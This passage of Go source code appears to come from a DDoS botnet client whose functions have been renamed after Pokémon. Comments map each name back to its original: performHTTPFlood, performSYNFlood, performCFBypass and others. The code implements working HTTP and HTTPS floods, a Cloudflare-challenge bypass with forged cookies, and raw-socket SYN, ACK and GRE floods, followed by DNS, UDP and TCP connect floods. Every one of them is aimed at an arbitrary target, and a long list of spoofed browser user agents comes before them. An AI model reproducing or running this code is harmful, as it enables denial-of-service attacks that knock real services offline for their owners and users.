	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
	"Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
	"Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
	"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/8.0.5 Safari/600.5.17",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (iPad; CPU OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (X11; CrOS x86_64 7077.134.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.156 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/7.1.7 Safari/537.85.16",
	"Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/8.0.3 Safari/600.3.18",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4",
	"Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
	"Mozilla/5.0 (iPad; CPU OS 7_1_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D201 Safari/9537.53",
	"Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFTHWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/8.0.4 Safari/600.4.10",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:40.0) Gecko/20100101 Firefox/40.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2",
	"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; rv:11.0) like Gecko",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (iPad; CPU OS 8_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B410 Safari/600.1.4",
	"Mozilla/5.0 (iPad; CPU OS 7_0_4 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B554a Safari/9537.53",
	"Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
}

// performHTTPFlood => alakazam
func alakazam(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetURL := fmt.Sprintf("http://%s:%d", resolvedIP, targetPort)
	userAgents := []string{"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)", "Mozilla/5.0 (Linux; Android 11; SM-G996B)", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)"}
	referers := []string{"https://www.google.com/", "https://www.example.com/", "https://www.wikipedia.org/"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			client := &http.Client{}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					body := make([]byte, 1024)
					req, err := http.NewRequest("POST", targetURL, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Referer", referers[rand.Intn(len(referers))])
					resp, _ := client.Do(req)
					if resp != nil {
						resp.Body.Close()
					}
					atomic.AddInt64(&requestCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// performHTTPSFlood => machamp
func machamp(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	if idx := strings.Index(hostname, ":"); idx != -1 {
		hostname = hostname[:idx]
	}
	resolvedIP, err := lucario(target)
	if err != nil {
		return
	}
	targetAddr := fmt.Sprintf("%s:%d", resolvedIP, targetPort)
	tlsConfig := &tls.Config{InsecureSkipVerify: true, ServerName: hostname, MinVersion: tls.VersionTLS12, MaxVersion: tls.VersionTLS13}
	paths := []string{"/", "/index.html", "/api", "/search", "/login", "/wp-admin"}
	methods := []string{"GET", "POST", "HEAD"}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					dialer := &net.Dialer{Timeout: 5 * time.Second}
					conn, err := tls.DialWithDialer(dialer, "tcp", targetAddr, tlsConfig)
					if err != nil {
						continue
					}
					for j := 0; j < 10; j++ {
						select {
						case <-ctx.Done():
							conn.Close()
							return
						case <-stopCh:
							conn.Close()
							return
						default:
						}
						method := methods[rand.Intn(len(methods))]
						path := paths[rand.Intn(len(paths))]
						ua := eevee[rand.Intn(len(eevee))]
						var reqBuilder strings.Builder
						reqBuilder.WriteString(fmt.Sprintf("%s %s HTTP/1.1\r\n", method, path))
						reqBuilder.WriteString(fmt.Sprintf("Host: %s\r\n", hostname))
						reqBuilder.WriteString(fmt.Sprintf("User-Agent: %s\r\n", ua))
						reqBuilder.WriteString("Accept: text/html,application/xhtml+xml\r\n")
						reqBuilder.WriteString("Connection: keep-alive\r\n")
						if method == "POST" {
							body := turla(rand.Intn(1024) + 256)
							reqBuilder.WriteString(fmt.Sprintf("Content-Length: %d\r\n\r\n", len(body)))
							reqBuilder.WriteString(body)
						} else {
							reqBuilder.WriteString("\r\n")
						}
						conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
						if _, err := conn.Write([]byte(reqBuilder.String())); err != nil {
							break
						}
						atomic.AddInt64(&requestCount, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

type ditto struct {
	cookies   []*http.Cookie
	userAgent string
	client    *http.Client
}

func zorua() *ditto {
	jar, _ := zoroark()
	return &ditto{
		cookies:   nil,
		userAgent: eevee[rand.Intn(len(eevee))],
		client: &http.Client{
			Timeout: 30 * time.Second,
			Jar:     jar,
			Transport: &http.Transport{
				TLSClientConfig:   &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12},
				DisableKeepAlives: false,
				MaxIdleConns:      100,
				IdleConnTimeout:   90 * time.Second,
			},
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				if len(via) >= 10 {
					return fmt.Errorf("too many redirects")
				}
				return nil
			},
		},
	}
}

func zoroark() (http.CookieJar, error) {
	return &mimikyu{cookies: make(map[string][]*http.Cookie)}, nil
}

type mimikyu struct {
	mu      sync.Mutex
	cookies map[string][]*http.Cookie
}

func (j *mimikyu) SetCookies(u *url.URL, cookies []*http.Cookie) {
	j.mu.Lock()
	defer j.mu.Unlock()
	j.cookies[u.Host] = append(j.cookies[u.Host], cookies...)
}

func (j *mimikyu) Cookies(u *url.URL) []*http.Cookie {
	j.mu.Lock()
	defer j.mu.Unlock()
	return j.cookies[u.Host]
}

func (s *ditto) gastly(targetURL string) error {
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", s.userAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	resp, err := s.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	s.cookies = resp.Cookies()
	if resp.StatusCode == 503 || resp.StatusCode == 403 {
		time.Sleep(5 * time.Second)
		req2, _ := http.NewRequest("GET", targetURL, nil)
		req2.Header.Set("User-Agent", s.userAgent)
		for _, c := range s.cookies {
			req2.AddCookie(c)
		}
		resp2, err := s.client.Do(req2)
		if err != nil {
			return err
		}
		defer resp2.Body.Close()
		s.cookies = resp2.Cookies()
	}
	return nil
}

// performCFBypass => gyarados
func gyarados(target string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var requestCount int64
	var bypassCount int64
	var wg sync.WaitGroup
	hostname := target
	hostname = strings.TrimPrefix(hostname, "https://")
	hostname = strings.TrimPrefix(hostname, "http://")
	if idx := strings.Index(hostname, "/"); idx != -1 {
		hostname = hostname[:idx]
	}
	scheme := "https"
	if targetPort == 80 {
		scheme = "http"
	}
	targetURL := fmt.Sprintf("%s://%s:%d/", scheme, hostname, targetPort)
	paths := []string{"/", "/index.php", "/wp-login.php", "/admin", "/api/v1/", "/search?q=" + turla(8), "/cdn-cgi/trace"}
	sessionWorkers := 50
	if cozyBear < sessionWorkers {
		sessionWorkers = cozyBear
	}
	for i := 0; i < sessionWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			session := zorua()
			if session.gastly(targetURL) == nil {
				atomic.AddInt64(&bypassCount, 1)
			}
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					path := paths[rand.Intn(len(paths))]
					reqURL := fmt.Sprintf("%s://%s:%d%s", scheme, hostname, targetPort, path)
					req, err := http.NewRequest("GET", reqURL, nil)
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", session.userAgent)
					req.Header.Set("Accept", "text/html,application/xhtml+xml")
					req.Header.Set("Connection", "keep-alive")
					for _, c := range session.cookies {
						req.AddCookie(c)
					}
					req.AddCookie(&http.Cookie{Name: "__cf_bm", Value: turla(32)})
					resp, err := session.client.Do(req)
					if err != nil {
						continue
					}
					if len(resp.Cookies()) > 0 {
						session.cookies = append(session.cookies, resp.Cookies()...)
					}
					io.Copy(io.Discard, resp.Body)
					resp.Body.Close()
					atomic.AddInt64(&requestCount, 1)
					if resp.StatusCode == 503 || resp.StatusCode == 403 {
						time.Sleep(time.Duration(rand.Intn(3)+2) * time.Second)
						session.gastly(targetURL)
					}
				}
			}
		}()
	}
	wg.Wait()
}

// performSYNFlood => dragonite
func dragonite(targetIP string, targetPort, duration int) {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(52024) + 1024), DstPort: layers.TCPPort(targetPort), Seq: rand.Uint32(), Window: 12800, SYN: true, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// performACKFlood => tyranitar
func tyranitar(targetIP string, targetPort int, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					tcpLayer := &layers.TCP{SrcPort: layers.TCPPort(rand.Intn(64312) + 1024), DstPort: layers.TCPPort(targetPort), ACK: true, Seq: rand.Uint32(), Ack: rand.Uint32(), Window: 12800, DataOffset: 5}
					payload := make([]byte, 65535-40)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, tcpLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// performGREFlood => metagross
func metagross(targetIP string, duration int) error {
	rand.Seed(time.Now().UnixNano())
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return err
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return fmt.Errorf("invalid IP")
	}
	var packetCount int64
	var wg sync.WaitGroup
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					greLayer := &layers.GRE{}
					payload := make([]byte, 65535-24)
					rand.Read(payload)
					buffer := gopacket.NewSerializeBuffer()
					gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{}, greLayer, gopacket.Payload(payload))
					conn.WriteTo(buffer.Bytes(), &net.IPAddr{IP: dstIP})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
	return nil
}

// performDNSFlood => salamence
func salamence(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var packetCount int64
	var wg sync.WaitGroup
	domains := []string{"youtube.com", "google.com", "spotify.com", "netflix.com", "bing.com", "facebook.com", "amazon.com"}
	queryTypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			conn, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer conn.Close()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					domain := domains[rand.Intn(len(domains))]
					queryType := queryTypes[rand.Intn(len(queryTypes))]
					dnsQuery := garchomp(domain, queryType)
					buffer, _ := dnsQuery.Pack()
					conn.WriteTo(buffer, &net.UDPAddr{IP: dstIP, Port: targetPort})
					atomic.AddInt64(&packetCount, 1)
				}
			}
		}()
	}
	wg.Wait()
}

// constructDNSQuery => garchomp
func garchomp(domain string, queryType uint16) *dns.Msg {
	msg := new(dns.Msg)
	msg.SetQuestion(dns.Fqdn(domain), queryType)
	edns0 := new(dns.OPT)
	edns0.Hdr.Name = "."
	edns0.Hdr.Rrtype = dns.TypeOPT
	edns0.SetUDPSize(4096)
	msg.Extra = append(msg.Extra, edns0)
	return msg
}

// performUDPFlood => snorlax
func snorlax(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	payload := make([]byte, 1024)
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("udp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write(payload)
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}

// TCPfloodAttack => gengar
func gengar(targetIP string, targetPort, duration int) {
	resolvedIP, err := lucario(targetIP)
	if err != nil {
		return
	}
	dstIP := net.ParseIP(resolvedIP)
	if dstIP == nil {
		return
	}
	stopCh := raichu()
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(duration)*time.Second)
	defer cancel()
	var wg sync.WaitGroup
	for i := 0; i < cozyBear; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case <-stopCh:
					return
				default:
					conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", dstIP, targetPort))
					if err != nil {
						continue
					}
					conn.Write([]byte("GET / HTTP/1.1\r\n\r\n"))
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
}
